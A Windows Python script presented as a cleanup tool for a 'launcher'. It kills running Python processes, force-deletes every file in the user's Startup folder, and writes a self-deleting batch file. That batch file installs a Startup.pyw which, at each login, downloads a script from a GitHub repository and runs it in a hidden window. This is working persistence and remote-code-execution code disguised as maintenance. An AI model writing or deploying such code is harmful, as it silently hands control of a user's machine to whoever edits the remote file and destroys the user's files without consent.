# monitor_script.py - Final solution: Stops old launcher, then cleans up
import os
import sys
import subprocess
import tempfile
import time
import urllib.request
import psutil

def stop_old_launcher():
    """Stop the current running launcher process"""
    try:
        # Get current script's parent process (the old launcher)
        current_pid = os.getpid()
        current_process = psutil.Process(current_pid)
        parent = current_process.parent()
        
        if parent and "python" in parent.name().lower():
            print(f"Found old launcher process: {parent.pid}")
            
            # Kill it
            parent.terminate()
            time.sleep(2)
            
            # Force kill if still running
            if parent.is_running():
                parent.kill()
                
            print("✓ Stopped old launcher")
            return True
            
    except Exception as e:
        print(f"Could not stop old launcher: {e}")
    
    # Alternative: Kill all python processes in startup folder
    try:
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.info['name'] and 'python' in proc.info['name'].lower():
                    cmdline = proc.info['cmdline']
                    if cmdline and any(startup_folder in str(arg) for arg in cmdline):
                        print(f"Killing Python process: {proc.pid}")
                        proc.terminate()
            except:
                pass
        
        time.sleep(3)
        return True
        
    except Exception as e:
        print(f"Alternative kill failed: {e}")
    
    return False

def force_cleanup():
    """Force delete ALL files from startup folder"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # Create a batch file that runs AFTER this Python process exits
    batch_script = f'''@echo off
:: Wait for Python process to exit
timeout /t 3 /nobreak >nul

:: Kill any remaining Python processes
taskkill /f /im python.exe 2>nul
taskkill /f /im pythonw.exe 2>nul
timeout /t 2 /nobreak >nul

cd /d "{startup_folder}"

:: Delete ALL files
echo [CLEANUP] Deleting everything...
del /f /q *.* 2>nul
del /f /q *.log 2>nul
del /f /q *.txt 2>nul
del /f /q *.json 2>nul
del /f /q *.py 2>nul
del /f /q *.pyw 2>nul
del /f /q *.pyc 2>nul
del /f /q *.bat 2>nul
del /f /q requirements.txt 2>nul

:: Delete __pycache__
for /d %%d in (__pycache__) do rmdir /s /q "%%d" 2>nul

:: Now create new launcher
echo [SETUP] Creating new launcher...

:: Download and create ONLY Startup.pyw
powershell -Command "
try {{
    $url = 'https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw'
    $code = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
    [System.IO.File]::WriteAllText('{startup_folder}\\Startup.pyw', $code)
    Write-Host 'Created Startup.pyw'
}} catch {{
    Write-Host 'Download failed, using built-in code'
    @'
import os, sys, subprocess, urllib.request, tempfile, time
def run():
    try:
        url = \"https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py\"
        code = urllib.request.urlopen(url).read().decode('utf-8')
        tf = tempfile.gettempdir() + \"/script_temp.py\"
        with open(tf, \"w\") as f: f.write(code)
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        subprocess.Popen([sys.executable, tf], startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(5)
        try: os.remove(tf)
        except: pass
    except: pass
    while True: time.sleep(3600)
if __name__ == \"__main__\": run()
'@ | Out-File -FilePath '{startup_folder}\\Startup.pyw' -Encoding ascii
}}
"

:: Verify only Startup.pyw exists
echo [VERIFY] Files in startup folder:
dir /b "{startup_folder}"

:: Start the new launcher
echo [START] Starting new launcher...
start /b "" pythonw "{startup_folder}\\Startup.pyw"

echo [DONE] Cleanup complete!
timeout /t 2 /nobreak >nul
del "%~f0" 2>nul
'''
    
    # Save batch file
    batch_path = tempfile.gettempdir() + "/final_cleanup.bat"
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run batch file (will run after this script exits)
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    
    subprocess.Popen(
        ['cmd', '/c', batch_path],
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    
    return True

def main():
    """Main function - stops old launcher and schedules cleanup"""
    print("=" * 60)
    print("FINAL CLEANUP - STOPPING OLD LAUNCHER")
    print("=" * 60)
    
    # Step 1: Stop the old launcher
    print("\n[1/3] Stopping old launcher...")
    stop_old_launcher()
    
    # Step 2: Schedule cleanup (runs after this script exits)
    print("\n[2/3] Scheduling cleanup...")
    force_cleanup()
    
    print("\n[3/3] Exiting - cleanup will run in background")
    print("\n" + "=" * 60)
    print("SUCCESS!")
    print("Old launcher stopped")
    print("Cleanup scheduled")
    print("New launcher will be created")
    print("=" * 60)
    
    # Exit immediately so batch file can run
    sys.exit(0)

if __name__ == "__main__":
    # Install psutil if needed
    try:
        import psutil
    except ImportError:
        print("Installing psutil...")
        subprocess.run([sys.executable, "-m", "pip", "install", "psutil", "--quiet"],
                      creationflags=subprocess.CREATE_NO_WINDOW)
        import psutil
    
    main()
